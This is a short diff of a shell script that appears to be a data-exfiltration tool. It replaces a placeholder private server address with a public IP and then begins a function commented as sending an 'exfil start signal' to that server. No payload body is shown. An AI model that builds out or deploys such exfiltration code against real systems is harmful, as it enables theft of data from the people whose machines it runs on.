@@ -1,6 +1,6 @@
 #!/bin/sh
 
-svr=192.168.181.173  ## need to change this
+svr=192.241.245.110
 
 # send exfil start signal to server
 signal_exfil_start()
